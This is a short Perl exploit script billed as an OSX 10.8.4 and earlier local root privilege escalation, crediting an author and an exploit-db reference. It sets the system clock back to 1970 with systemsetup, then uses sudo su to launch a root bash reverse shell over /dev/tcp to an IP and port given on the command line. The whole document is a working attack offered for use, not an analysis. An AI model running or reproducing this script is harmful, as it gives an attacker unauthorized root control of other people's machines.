EXP
---

    #!/usr/bin/env perl

    $num_args = $#ARGV + 1;
    if ($num_args != 2) {
        print "\nUsage: exploit.pl ip.add.re.ss port\n";
        exit;
    }

    print "\n";
    print "=============================================================================================================\n";
    print " - OSX <= 10.8.4 Local Root Priv Escalation Root Reverse Shell by ";
    print " - [Bek Umarov @ HackEd]\n";
    print " - Reference: http://www.exploit-db.com/exploits/27965/\n";
    print "=============================================================================================================\n";
    print "\n";


    my $ipaddr = @ARGV[0];
    my $port   = @ARGV[1];

    my $proc = `systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su -c "bash -i >& /dev/tcp/$ipaddr/$port 0>&1 &"`;

    print "[*] Exploit has been performed. You should have a shell on ipaddr: $ipaddr and port $port\n\n";